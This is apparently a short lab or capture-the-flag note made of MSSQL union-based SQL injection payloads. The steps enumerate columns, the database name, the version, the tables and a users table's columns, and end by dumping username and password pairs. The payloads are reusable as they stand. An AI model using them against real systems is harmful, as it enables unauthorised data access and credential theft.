Find columns:

```bash
10' union select 1,2,3,4,5,6 -- -
```

![[Pasted image 20250709114757.png]]

Database name :

```bash
10' union select 1,(select DB_NAME()),3,4,5,6-- - 
```

![[Pasted image 20250709114829.png]]

Tables in database:

```bash
10' union select 1, (SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype= 'U'),3,4,5,6-- -
```

![[Pasted image 20250709114855.png]]

MSSQL version number:

```bash
10 ' union select 1,@@version,3,4,5,6 -- -
```

![[Pasted image 20250709114927.png]]

Column names for the `users` table :

```bash
10' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
```

![[Pasted image 20250709115017.png]]

List data in username and password column from the `users` table:

```bash
10' union select 1,CONCAT(username, ':',password),3,4,5,6 FROM users-- -
```
 ![[Pasted image 20250709115100.png]]
 
